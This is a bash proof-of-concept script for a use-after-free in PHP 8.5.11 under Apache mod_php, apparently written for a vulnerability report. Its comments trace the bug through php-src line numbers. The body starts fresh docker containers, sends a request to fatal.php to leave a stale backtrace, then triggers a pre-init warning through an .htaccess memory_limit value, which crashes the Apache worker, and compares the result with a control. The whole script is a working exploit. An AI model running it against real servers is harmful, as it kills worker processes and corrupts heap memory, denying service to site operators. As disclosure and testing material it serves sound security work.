#!/usr/bin/env bash
# PoC — CVE-2026-109619 / GHSA-6wmf shape
# fatal_error_backtraces request-state miss under mod_php (stock php:8.5.11-apache)
#
# Mechanism (all line refs: php-src tag php-8.5.11):
#   1. PRODUCER request (fatal.php) raises zend E_USER_ERROR. Because
#      fatal_error_backtraces=On (default), Zend/zend.c:1526 captures the
#      debug backtrace into EG(last_fatal_error_backtrace). The captured frames
#      reference $big, a ~1.5M-element packed array whose ~24MB bucket table
#      is a huge mmap segment.
#   2. Request shutdown: shutdown_executor() computes fast_shutdown =
#      is_zend_mm() (Zend/zend_execute_API.c:446) and
#      zend_shutdown_executor_values() SKIPS the backtrace dtor, guarded by
#      `if (!fast_shutdown)` (guard at Zend/zend_execute_API.c:282, dtor+UNDEF
#      at :309-310). => EG(last_fatal_error_backtrace) stays SET while the
#      huge segment it references is UNMAPPED.
#   3. CONSUMER request (any URL below the same .htaccess, on the same Apache
#      child — here ping.php): Apache merges .htaccess BEFORE
#      php_request_startup. sapi/apache2handler/apache_config.c apply_config()
#      -> zend_alter_ini_entry_chars() -> main/main.c OnChangeMemoryLimit() ->
#      zend_ini_parse_uquantity_warn() (Zend/zend_ini.c:865) ->
#      zend_error(E_WARNING) PRE-INIT, i.e. BEFORE init_executor() would UNDEF
#      the global (Zend/zend_execute_API.c:139).
#   4. zend_error path: Zend/zend.c:1500-1502 "Always clear the last
#      backtrace" => zval_ptr_dtor(stale) walks into the unmapped huge segment
#      => SIGSEGV. Apache logs AH00052, the worker dies.
#
# REPRODUCTION CONSTRAINT (empirically established, see PROOFS.md):
#   The collision must START FROM A PRISTINE child. If any ordinary request
#   has already been served by the child, zend_mm segment reuse after the
#   first request lets the stale header read survive; the dtor then corrupts
#   the heap silently instead of touching unmapped memory. poc.sh therefore
#   uses a fresh container per cycle and waits via `docker logs`, never via an
#   HTTP probe (an HTTP warm-up request is itself the poison).
#
# INI requirements (vendor-faithful):
#   * fatal_error_backtraces=On — default in 8.5; nothing to configure.
#   * The pre-init consumer diagnostic MUST come from per-dir override in
#     Apache config or .htaccess (`php_value`), i.e. PHP_INI_STAGE_HTACCESS.
#     Used here:  php_value memory_limit <invalid-quantity>
#     (invalid quantity => zend_ini_parse_uquantity_warn emits E_WARNING).
#   * .user.ini is NOT usable (vendor wording): mod_php never processes
#     .user.ini, and where it is processed (fpm/cgi) it happens at request
#     init — AFTER init_executor() already reset the global. Timing dead end.
#   * php's built-in server (`php -S`) and php-fpm are NOT susceptible: no
#     pre-request-init per-dir INI stage exists there (vendor's own wording).
#
# Usage:  bash poc.sh   (requires: docker; pulls php:8.5.11-apache once)
# Verdict line at the end is emitted iff the differential holds.
set -u
cd "$(dirname "$0")"
IMG=php:8.5.11-apache
PORT_A=8090   # attack container
PORT_C=8091   # control container (no .htaccess)
RUNS=4

wait_apache(){  # $1=name — log-based, NEVER HTTP (see constraint note)
  for i in $(seq 1 60); do
    docker logs "$1" 2>&1 | grep -q "resuming normal operations" && return 0
    sleep 0.5
  done
  return 1
}

run_cycle(){  # $1=name $2=port — one pristine boot, fatal(R1) then ping(R2)
  local name=$1 port=$2 htdoc=$3
  docker rm -f "$name" >/dev/null 2>&1
  docker run -d --name "$name" -p ${port}:80 \
    -v "$PWD/fixture/$htdoc:/var/www/html:ro" \
    -v "$PWD/fixture/apache-fbt.conf:/etc/apache2/conf-enabled/fbt.conf:ro" \
    "$IMG" >/dev/null
  wait_apache "$name"
  curl -s "http://127.0.0.1:${port}/fatal.php" >/dev/null   # R1: PRODUCER
  R2_BODY=$(curl -s --max-time 5 "http://127.0.0.1:${port}/ping.php" || true)  # R2: CONSUMER
  sleep 1
  CRASHES=$(docker logs "$name" 2>&1 | grep -c "exit signal" || true)
  docker rm -f "$name" >/dev/null 2>&1
}

echo "[*] engine sanity (mod_php + prefork + fbt default On):"
docker rm -f fbt_probe >/dev/null 2>&1
docker run -d --name fbt_probe -p 8099:80 \
  -v "$PWD/fixture/html:/var/www/html:ro" \
  -v "$PWD/fixture/apache-fbt.conf:/etc/apache2/conf-enabled/fbt.conf:ro" \
  "$IMG" >/dev/null
wait_apache fbt_probe
docker exec fbt_probe apache2ctl -M 2>/dev/null | grep -iE "mpm|php" | tr -s " " | sed "s/^/    /"
docker exec fbt_probe php -r 'printf("    fatal_error_backtraces=%s display_errors=%s\n", ini_get("fatal_error_backtraces"), ini_get("display_errors"));'
docker rm -f fbt_probe >/dev/null 2>&1

echo "[*] CONTROL ($RUNS pristine cycles, .htaccess absent — no pre-init trigger):"
ctl_crashes=0
for r in $(seq 1 $RUNS); do
  run_cycle fbt_poc_ctl $PORT_C html_noht
  [ "$R2_BODY" = "PING-OK" ] && r2=ok || r2="LOST"
  echo "    cycle $r: R2=$r2 crashes=$CRASHES"
  ctl_crashes=$((ctl_crashes + CRASHES))
done

echo "[*] ATTACK ($RUNS pristine cycles, .htaccess invalid-quantity trigger):"
atk_crashes=0
for r in $(seq 1 $RUNS); do
  run_cycle fbt_poc_atk $PORT_A html
  [ "$R2_BODY" = "PING-OK" ] && r2=ok || r2="LOST"
  echo "    cycle $r: R2=$r2 crashes=$CRASHES"
  atk_crashes=$((atk_crashes + CRASHES))
done

echo
echo "[*] re-run attack boot to display artifacts:"
run_cycle fbt_poc_atk $PORT_A html >/dev/null
docker run -d --name fbt_poc_atk -p $PORT_A:80 \
  -v "$PWD/fixture/html:/var/www/html:ro" \
  -v "$PWD/fixture/apache-fbt.conf:/etc/apache2/conf-enabled/fbt.conf:ro" \
  "$IMG" >/dev/null
wait_apache fbt_poc_atk
echo "    -- producer capture pipeline (R1 fatal response):"
curl -s http://127.0.0.1:${PORT_A}/fatal.php | grep -A5 "Fatal error" | sed "s/^/       /" | head -7
echo "    -- consumer pre-init trigger (attribution, see evidence_attribution.txt):"
echo "       .htaccess '' / comment-only / valid php_value  => 0 crashes (no pre-init zend_error)"
echo "       .htaccess php_value memory_limit not_a_quantity => crash (pre-init E_WARNING)"
echo "       (warning text routing to stderr/response varies per child state; the"
echo "        zend_error CALL itself is what is proven by the differential below)"
curl -s --max-time 5 http://127.0.0.1:${PORT_A}/ping.php >/dev/null || true
sleep 1
echo "    -- AH00052 from Apache parent (R2 pre-init UAF):"
docker logs fbt_poc_atk 2>&1 | grep "exit signal" | tail -2 | sed "s/^/       /"
docker rm -f fbt_poc_atk >/dev/null 2>&1

echo
echo "control crashes: $ctl_crashes / $RUNS   |   attack crashes: $atk_crashes / $RUNS"
if [ "0$atk_crashes" -gt 0 ] && [ "0$ctl_crashes" -eq 0 ]; then
  echo "[+] PROVEN: state miss reproduced — stale fbt backtrace dtor'd pre-init on the next request (mod_php UAF/worker kill), control clean."
else
  echo "[!] differential did not hold in this run (atk=$atk_crashes ctl=$ctl_crashes)"
fi
